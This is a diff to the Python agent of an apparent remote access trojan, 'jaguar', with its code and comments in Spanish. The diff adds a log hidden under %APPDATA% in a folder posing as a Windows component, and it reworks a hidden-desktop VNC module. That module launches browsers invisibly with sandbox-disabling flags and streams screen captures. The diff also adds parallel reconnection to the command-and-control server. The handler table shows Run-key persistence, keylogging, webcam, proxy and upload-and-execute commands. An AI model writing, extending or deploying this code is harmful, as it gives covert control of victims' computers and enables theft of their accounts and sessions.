@@ -7,6 +7,8 @@ Protocolo IDÉNTICO al controlador (jaguar/server/sesion.py + jaguar/common/crip
   - handshake agente->servidor: {"tipo":"hola","info":{...}}
   - servidor->agente: {"tipo":"comando","cmd":...,"args":...} | {"tipo":"beacon",...}
   - agente->servidor: {"tipo":"respuesta","cmd":...,"ok":...,"datos":...}
+
+Log persistente: %APPDATA%\\Microsoft\\Windows\\RuntimeBroker\\jaguar.log (rotativo 1 MB).
 """
 import base64
 import hashlib
@@ -47,7 +49,6 @@ _KLOG = []
 _KLOG_ON = False
 _PROXY_ON = False
 _SALIR = False
-_HVNC = {"pid": None, "hwnd": None, "hdesk": None, "navegador": None}
 _WCAM = {"on": False, "frame": b"", "w": 0, "h": 0}
 
 # ====================== CRIPTO (idéntico a jaguar/common/cripto.py) ==========
@@ -136,6 +137,37 @@ def _recibir(sock):
         return json.loads(descifrar(d).decode("utf-8"))
     except Exception:
         return {}
+
+
+# ============================ LOG persistente ===============================
+DIR_LOG = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
+                       "Microsoft", "Windows", NOMBRE)
+RUTA_LOG = os.path.join(DIR_LOG, "jaguar.log")
+_MAX_LOG = 1_000_000
+
+
+def _log(nivel, txt):
+    try:
+        os.makedirs(DIR_LOG, exist_ok=True)
+        if os.path.isfile(RUTA_LOG) and os.path.getsize(RUTA_LOG) > _MAX_LOG:
+            try:
+                os.replace(RUTA_LOG, RUTA_LOG + ".1")
+            except Exception:
+                pass
+        with open(RUTA_LOG, "a", encoding="utf-8") as f:
+            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{nivel}] {txt}\n")
+    except Exception:
+        pass
+
+
+def _log_leer(a):
+    n = int(a.get("lineas", 200))
+    try:
+        with open(RUTA_LOG, encoding="utf-8", errors="replace") as f:
+            return {"ruta": RUTA_LOG, "texto": "".join(f.readlines()[-n:])}
+    except Exception as e:
+        return {"error": str(e), "ruta": RUTA_LOG}
+# ============================================================================
 
 
 def _cfg():
@@ -444,9 +476,11 @@ def _persistir(a):
                                0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(k, NOMBRE, 0, winreg.REG_SZ, arranque)
             winreg.CloseKey(k)
+            _log("PERSIST", f"instalada -> {destino}")
             return {"persistencia": f"HKCU\\...\\Run[{NOMBRE}]", "copia": destino}
         return {"persistencia": "cron (no-op)", "copia": destino}
     except Exception as e:
+        _log("PERSIST", f"error: {e}")
         return {"error": str(e)}
 
 
@@ -564,21 +598,21 @@ def _desconectar(a):
     return {"estado": "adios"}
 
 
-# ---------------------------------- HVNC ------------------------------------
+# ================================== HVNC ====================================
 if _WIN:
     import ctypes
     from ctypes import wintypes
     _u32 = ctypes.windll.user32
     _k32 = ctypes.windll.kernel32
     _g32 = ctypes.windll.gdi32
+    _advapi32 = ctypes.windll.advapi32
 
     DESKTOP_ALL = 0x01FF
     DESKTOP_ACCESS = 0x000F0000 | DESKTOP_ALL
     DESKTOP_NAME = "JaguarHVNC"
+    PW_RENDERFULLCONTENT = 0x00000002
     _CLASES_BROWSER = ("Chrome_WidgetWin_1", "Chrome_WidgetWin_0",
                        "MozillaWindowClass", "ApplicationFrameWindow")
-    PW_RENDERFULLCONTENT = 0x00000002
-    _ENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
 
     class _STARTUPINFOW(ctypes.Structure):
         _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
@@ -614,6 +648,17 @@ if _WIN:
     class _BITMAPINFO(ctypes.Structure):
         _fields_ = [("bmiHeader", _BIH), ("bmiColors", wintypes.DWORD * 3)]
 
+    class _SECURITY_ATTRIBUTES(ctypes.Structure):
+        _fields_ = [("nLength", wintypes.DWORD),
+                    ("lpSecurityDescriptor", ctypes.c_void_p),
+                    ("bInheritHandle", wintypes.BOOL)]
+
+    class _SECURITY_DESCRIPTOR(ctypes.Structure):
+        _fields_ = [("Revision", ctypes.c_ubyte), ("Sbz1", ctypes.c_ubyte),
+                    ("Control", wintypes.WORD), ("Owner", ctypes.c_void_p),
+                    ("Group", ctypes.c_void_p), ("Sacl", ctypes.c_void_p),
+                    ("Dacl", ctypes.c_void_p)]
+
     _u32.CreateDesktopW.restype = wintypes.HANDLE
     _u32.CreateDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.c_void_p,
                                     wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
@@ -621,6 +666,7 @@ if _WIN:
     _u32.OpenDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
     _u32.CloseDesktop.argtypes = [wintypes.HANDLE]
     _u32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
+    _u32.SetThreadDesktop.restype = wintypes.BOOL
     _u32.EnumDesktopWindows.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.LPARAM]
     _u32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(_RECT)]
     _u32.GetClassNameW.argtypes = [wintypes.HWND, wintypes.LPWSTR, ctypes.c_int]
@@ -636,6 +682,8 @@ if _WIN:
                                     ctypes.c_void_p, wintypes.LPCWSTR,
                                     ctypes.POINTER(_STARTUPINFOW),
                                     ctypes.POINTER(_PROCESS_INFORMATION)]
+    _k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+    _k32.GetExitCodeProcess.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
     _g32.CreateCompatibleDC.argtypes = [wintypes.HDC]
     _g32.CreateCompatibleDC.restype = wintypes.HDC
     _g32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
@@ -645,31 +693,91 @@ if _WIN:
                                ctypes.c_void_p, ctypes.POINTER(_BITMAPINFO), wintypes.UINT]
     _g32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
     _g32.DeleteDC.argtypes = [wintypes.HDC]
+    _advapi32.InitializeSecurityDescriptor.argtypes = [ctypes.c_void_p, wintypes.DWORD]
+    _advapi32.SetSecurityDescriptorDacl.argtypes = [ctypes.c_void_p, wintypes.BOOL,
+                                                    ctypes.c_void_p, wintypes.BOOL]
+
+    _ENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
+
+# Flags que hacen que Chrome pinte y no se duerma en un escritorio oculto.
+_FLAGS_CHROMIUM = (
+    "--no-sandbox --disable-gpu-sandbox --disable-gpu --disable-gpu-compositing "
+    "--disable-features=CalculateNativeWinOcclusion "
+    "--disable-backgrounding-occluded-windows --disable-renderer-backgrounding "
+    "--disable-background-timer-throttling --disable-hang-monitor "
+    "--disable-ipc-flooding-protection --disable-session-crashed-bubble "
+    "--hide-crash-restore-bubble --noerrdialogs"
+)
+
+_HVNC = {"pid": None, "hwnd": None, "hdesk": None, "navegador": None, "exe": None,
+         "error": None, "estado": "idle", "perfil": None, "hash": None, "_sd": None}
+
+
+def _sec_dacl_null():
+    """SECURITY_ATTRIBUTES con DACL NULL: cualquier hijo puede abrir el desktop."""
+    sd = _SECURITY_DESCRIPTOR()
+    _advapi32.InitializeSecurityDescriptor(ctypes.byref(sd), 1)          # REVISION
+    _advapi32.SetSecurityDescriptorDacl(ctypes.byref(sd), True, None, False)
+    sa = _SECURITY_ATTRIBUTES()
+    sa.nLength = ctypes.sizeof(_SECURITY_ATTRIBUTES)
+    sa.lpSecurityDescriptor = ctypes.cast(ctypes.byref(sd), ctypes.c_void_p)
+    sa.bInheritHandle = False
+    return sa, sd
 
 
 def _ruta_navegador(nav):
+    """Ruta COMPLETA del navegador (registro App Paths -> PATH -> rutas) o None."""
     nav = (nav or "chrome").lower()
+    alias = {
+        "chrome": ["chrome.exe"], "google-chrome": ["chrome.exe"],
+        "edge": ["msedge.exe"], "msedge": ["msedge.exe"],
+        "brave": ["brave.exe"], "opera": ["opera.exe", "launcher.exe"],
+        "firefox": ["firefox.exe"],
+    }.get(nav, [nav + ".exe"])
+
+    try:
+        import winreg
+        for exe in alias:
+            for raiz in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
+                try:
+                    k = winreg.OpenKey(raiz, r"SOFTWARE\Microsoft\Windows"
+                                             r"\CurrentVersion\App Paths\\" + exe)
+                    ruta = winreg.QueryValueEx(k, "")[0]
+                    winreg.CloseKey(k)
+                    if ruta and os.path.isfile(ruta):
+                        return ruta
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
+    for exe in alias:
+        r = shutil.which(exe)
+        if r:
+            return r
+
     cands = []
     if nav in ("chrome", "google-chrome"):
-        cands = [os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"),
-                 os.path.expandvars(r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"),
-                 os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe")]
+        cands = [r"%ProgramFiles%\Google\Chrome\Application\chrome.exe",
+                 r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe",
+                 r"%LocalAppData%\Google\Chrome\Application\chrome.exe"]
     elif nav in ("edge", "msedge"):
-        cands = [os.path.expandvars(r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"),
-                 os.path.expandvars(r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe")]
+        cands = [r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe",
+                 r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe"]
     elif nav == "brave":
-        cands = [os.path.expandvars(r"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe"),
-                 os.path.expandvars(r"%LocalAppData%\BraveSoftware\Brave-Browser\Application\brave.exe")]
+        cands = [r"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe",
+                 r"%LocalAppData%\BraveSoftware\Brave-Browser\Application\brave.exe"]
     elif nav == "opera":
-        cands = [os.path.expandvars(r"%LocalAppData%\Programs\Opera\opera.exe"),
-                 os.path.expandvars(r"%ProgramFiles%\Opera\opera.exe")]
+        cands = [r"%LocalAppData%\Programs\Opera\opera.exe",
+                 r"%ProgramFiles%\Opera\opera.exe"]
     elif nav == "firefox":
-        cands = [os.path.expandvars(r"%ProgramFiles%\Mozilla Firefox\firefox.exe"),
-                 os.path.expandvars(r"%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe")]
+        cands = [r"%ProgramFiles%\Mozilla Firefox\firefox.exe",
+                 r"%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe"]
     for c in cands:
-        if c and os.path.isfile(c):
-            return c
-    return nav + (".exe" if _WIN else "")
+        p = os.path.expandvars(c)
+        if p and os.path.isfile(p):
+            return p
+    return None
 
 
 def _hvnc_crear_desktop():
@@ -677,49 +785,60 @@ def _hvnc_crear_desktop():
         return _HVNC["hdesk"]
     h = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
     if not h:
-        h = _u32.CreateDesktopW(DESKTOP_NAME, None, None, 0, DESKTOP_ACCESS, None)
+        sa, sd = _sec_dacl_null()
+        h = _u32.CreateDesktopW(DESKTOP_NAME, None, None, 0, DESKTOP_ACCESS,
+                                ctypes.byref(sa))
+        _HVNC["_sd"] = sd
+        if not h:
+            _log("HVNC", f"CreateDesktopW fallo err={ctypes.GetLastError()}")
     _HVNC["hdesk"] = h
     return h
 
 
 def _hvnc_crear(exe, linea, desktop):
+    """CreateProcess con lpDesktop -> el hijo nace en el escritorio oculto."""
     si = _STARTUPINFOW()
     si.cb = ctypes.sizeof(_STARTUPINFOW)
     si.lpDesktop = "winsta0\\" + desktop
-    si.dwFlags = 0x00000001
-    si.wShowWindow = 4
+    si.dwFlags = 0x00000001                    # STARTF_USESHOWWINDOW
+    si.wShowWindow = 4                         # SW_SHOWNOACTIVATE
     pi = _PROCESS_INFORMATION()
     buf = ctypes.create_unicode_buffer(linea)
     ok = _k32.CreateProcessW(None, buf, None, None, False, 0, None, None,
                              ctypes.byref(si), ctypes.byref(pi))
     if not ok:
-        raise OSError("CreateProcess fallo")
-    pid = pi.dwProcessId
+        raise OSError(f"CreateProcess fallo err={ctypes.GetLastError()} exe={exe}")
+    pid, hproc = pi.dwProcessId, pi.hProcess
     try:
         _k32.CloseHandle(pi.hThread)
-        _k32.CloseHandle(pi.hProcess)
     except Exception:
         pass
-    return pid
+    return pid, hproc
 
 
 def _hvnc_lanzar(nav, url=None):
     exe = _ruta_navegador(nav)
-    perfil = os.path.join(tempfile.gettempdir(), "jaguar_hvnc_" + (nav or "chrome"))
+    if not exe:
+        raise OSError(f"navegador '{nav}' no encontrado (registro/PATH/rutas)")
+    perfil = os.path.join(tempfile.gettempdir(),
+                          f"jaguar_hvnc_{nav}_{os.getpid()}_{int(time.time())}")
     try:
         os.makedirs(perfil, exist_ok=True)
     except Exception:
         pass
     objetivo = '"%s"' % url if url else "about:blank"
-    pos = "--window-position=-32000,-32000 --window-size=1200,800"
-    if nav in ("chrome", "google-chrome", "edge", "msedge", "brave", "opera"):
-        extra = ("--no-sandbox --disable-gpu-sandbox --disable-gpu "
-                 "--disable-software-rasterizer")
-    else:
-        extra = ""
+    extra = _FLAGS_CHROMIUM if nav in ("chrome", "google-chrome", "edge",
+                                       "msedge", "brave", "opera") else ""
     linea = ('"{}" --user-data-dir="{}" --no-first-run --no-default-browser-check '
-             '--new-window {} {} {}').format(exe, perfil, objetivo, pos, extra)
-    return _hvnc_crear(exe, linea, DESKTOP_NAME)
+             '--new-window --window-size=1280,800 {} {}').format(
+        exe, perfil, objetivo, extra)
+    pid, hproc = _hvnc_crear(exe, linea, DESKTOP_NAME)
+    _log("HVNC", f"lanzado pid={pid} exe={exe}")
+    if _k32.WaitForSingleObject(hproc, 1500) == 0:
+        code = wintypes.DWORD()
+        _k32.GetExitCodeProcess(hproc, ctypes.byref(code))
+        _log("HVNC", f"AVISO: salio enseguida exit={code.value}")
+    return pid, perfil
 
 
 def _hvnc_buscar_ventana():
@@ -753,35 +872,42 @@ def _hvnc_iniciar(a):
     hdesk = _hvnc_crear_desktop()
     if not hdesk:
         return {"error": "no se pudo crear el desktop oculto"}
-    _HVNC["hwnd"] = None
-    _HVNC["navegador"] = nav
+    _HVNC.update({"hwnd": None, "navegador": nav, "error": None, "hash": None,
+                  "estado": "arrancando"})
+    _HVNC["exe"] = _ruta_navegador(nav)
+    _log("HVNC", f"iniciar nav={nav} exe={_HVNC['exe']} shell={bool(a.get('shell'))}")
 
     def trabajo():
+        ok = _u32.SetThreadDesktop(hdesk)
+        _log("HVNC", f"SetThreadDesktop={'ok' if ok else 'fallo'}")
+        if a.get("shell"):
+            try:
+                win = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "explorer.exe")
+                _hvnc_crear(win, '"%s"' % win, DESKTOP_NAME)
+                _log("HVNC", "explorer.exe lanzado")
+            except Exception as e:
+                _log("HVNC", f"explorer fallo: {e}")
         try:
-            _u32.SetThreadDesktop(hdesk)
-        except Exception:
-            pass
-        try:
-            _hvnc_crear(os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "explorer.exe"),
-                        '"%s"' % os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "explorer.exe"),
-                        DESKTOP_NAME)
-        except Exception:
-            pass
-        time.sleep(1.0)
-        try:
-            _HVNC["pid"] = _hvnc_lanzar(nav)
+            _HVNC["pid"], _HVNC["perfil"] = _hvnc_lanzar(nav)
         except Exception as e:
             _HVNC["error"] = str(e)
+            _log("HVNC", f"ERROR lanzando: {e}")
             return
-        for _ in range(40):
-            time.sleep(0.5)
+        for _ in range(60):
+            time.sleep(0.4)
             h = _hvnc_buscar_ventana()
             if h:
                 _HVNC["hwnd"] = h
-                break
+                _log("HVNC", f"ventana encontrada hwnd={h}")
+                return
+        _log("HVNC", "ventana NO encontrada (mira jaguar.log)")
 
     threading.Thread(target=trabajo, daemon=True).start()
-    return {"estado": "arrancando", "navegador": nav}
+    return {"estado": "arrancando", "navegador": nav, "exe": _HVNC["exe"]}
+
+
+def _hvnc_estado(a):
+    return {k: v for k, v in _HVNC.items() if k != "_sd"}
 
 
 def _hvnc_navegar(a):
@@ -790,6 +916,7 @@ def _hvnc_navegar(a):
         _hvnc_lanzar(nav, a.get("url", ""))
         return {"estado": "navegando"}
     except Exception as e:
+        _log("HVNC", f"ERROR navegar: {e}")
         return {"error": str(e)}
 
 
@@ -821,14 +948,29 @@ def _hvnc_captura(a):
     _g32.DeleteObject(bmp)
     _g32.DeleteDC(mdc)
     _u32.ReleaseDC(hwnd, hdc)
+
+    datos = buf.raw
+    huella = hashlib.md5(datos).digest()
+    if huella == _HVNC.get("hash") and not a.get("forzar"):
+        return {"w": w, "h": h, "b64": "", "sin_cambios": True}
+    _HVNC["hash"] = huella
+
+    raw = b""
     try:
-        from PIL import Image
-        img = Image.frombuffer("RGB", (w, h), buf.raw, "raw", "BGRX", 0, 1)
-        bio = io.BytesIO()
-        img.save(bio, "PNG")
-        raw = bio.getvalue()
+        import cv2
+        import numpy as np
+        arr = np.frombuffer(datos, dtype=np.uint8).reshape((h, w, 4))[:, :, :3]
+        ok, jpg = cv2.imencode(".jpg", arr, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
+        raw = jpg.tobytes() if ok else b""
     except Exception:
-        raw = b""
+        try:
+            from PIL import Image
+            img = Image.frombuffer("RGB", (w, h), datos, "raw", "BGRX", 0, 1)
+            bio = io.BytesIO()
+            img.save(bio, "PNG")
+            raw = bio.getvalue()
+        except Exception:
+            raw = b""
     return {"w": w, "h": h, "b64": base64.b64encode(raw).decode()}
 
 
@@ -894,12 +1036,18 @@ def _hvnc_cerrar(a):
     except Exception:
         pass
     _HVNC["hwnd"] = None
+    perfil = _HVNC.get("perfil")
+    if perfil:
+        shutil.rmtree(perfil, ignore_errors=True)
+        _HVNC["perfil"] = None
+    _HVNC["hash"] = None
     try:
         if _HVNC.get("hdesk"):
             _u32.CloseDesktop(_HVNC["hdesk"])
         _HVNC["hdesk"] = None
     except Exception:
         pass
+    _log("HVNC", "cerrado")
     return {"estado": "HVNC cerrado"}
 
 
@@ -913,9 +1061,13 @@ HANDLERS = {
     "descargar": _descargar, "subir_ejecutar": _subir_ejecutar,
     "proxy_iniciar": _proxy_iniciar, "proxy_parar": _proxy_parar,
     "hvnc_iniciar": _hvnc_iniciar, "hvnc_cerrar": _hvnc_cerrar, "hvnc_navegar": _hvnc_navegar,
+    "hvnc_estado": _hvnc_estado, "log": _log_leer,
     "hvnc_captura": _hvnc_captura, "hvnc_raton": _hvnc_raton, "hvnc_teclado": _hvnc_teclado,
     "desconectar": _desconectar,
 }
+
+_RUIDO = ("ping", "raton", "teclado", "hvnc_captura", "hvnc_raton",
+          "hvnc_teclado", "webcam_frame")
 
 
 def _bucle(sock):
@@ -928,40 +1080,83 @@ def _bucle(sock):
         if t == "beacon":
             SLEEP = float(msg.get("sleep", SLEEP))
             JITTER = float(msg.get("jitter", 0)) / 100.0
+            _log("BEACON", f"sleep={SLEEP} jitter={JITTER}")
             continue
         if t != "comando":
             continue
         cmd = msg.get("cmd")
+        if cmd not in _RUIDO:
+            _log("CMD", cmd)
         fn = HANDLERS.get(cmd)
         try:
             datos = fn(msg.get("args") or {}) if fn else {"error": "cmd desconocido"}
             _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": True, "datos": datos})
         except Exception as e:
+            _log("ERROR", f"{cmd}: {e}")
             _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": False, "error": str(e)})
         if _SALIR:
             os._exit(0)
 
 
+def _intentar(h, puerto, timeout):
+    try:
+        s = socket.create_connection((h, puerto), timeout=timeout)
+        s.settimeout(None)
+        return s
+    except Exception:
+        return None
+
+
+def _conectar(objetivos, puerto, timeout=5.0):
+    """Prueba todos los hosts EN PARALELO y devuelve la primera conexión viva."""
+    logrados = {}
+
+    def _w(h):
+        s = _intentar(h, puerto, timeout)
+        if s is not None:
+            logrados[h] = s
+
+    hilos = [threading.Thread(target=_w, args=(h,), daemon=True) for h in objetivos]
+    for t in hilos:
+        t.start()
+    fin = time.time() + timeout + 1.0
+    while not logrados and time.time() < fin:
+        time.sleep(0.05)
+    if not logrados:
+        return None
+    _, s = next(iter(logrados.items()))
+    for h2, s2 in logrados.items():
+        if s2 is not s:
+            try:
+                s2.close()
+            except Exception:
+                pass
+    return s
+
+
 def main():
     host, puerto, fb = _cfg()
-    globals()["PORT"] = puerto
     objetivos = []
     for h in (host, fb, "127.0.0.1"):
         if h and h not in objetivos:
             objetivos.append(h)
-    idx = 0
+    _log("AGENTE", f"inicio pid={os.getpid()} objetivos={objetivos} puerto={puerto}")
     while True:
-        h = objetivos[idx % len(objetivos)]
-        idx += 1
-        try:
-            s = socket.create_connection((h, puerto), timeout=8)
-            s.settimeout(None)
-            _enviar(s, {"tipo": "hola", "info": _sysinfo()})
-            _bucle(s)
-        except SystemExit:
-            return
-        except Exception:
-            pass
+        s = _conectar(objetivos, puerto, timeout=5.0)
+        if s is not None:
+            try:
+                _enviar(s, {"tipo": "hola", "info": _sysinfo()})
+                _log("AGENTE", "conectado al controlador")
+                _bucle(s)
+                _log("AGENTE", "desconectado")
+            except SystemExit:
+                return
+            except Exception as e:
+                _log("AGENTE", f"error de sesion: {e}")
+            try:
+                s.close()
+            except Exception:
+                pass
         time.sleep(SLEEP * (1 + random.uniform(-JITTER, JITTER)))
 
 
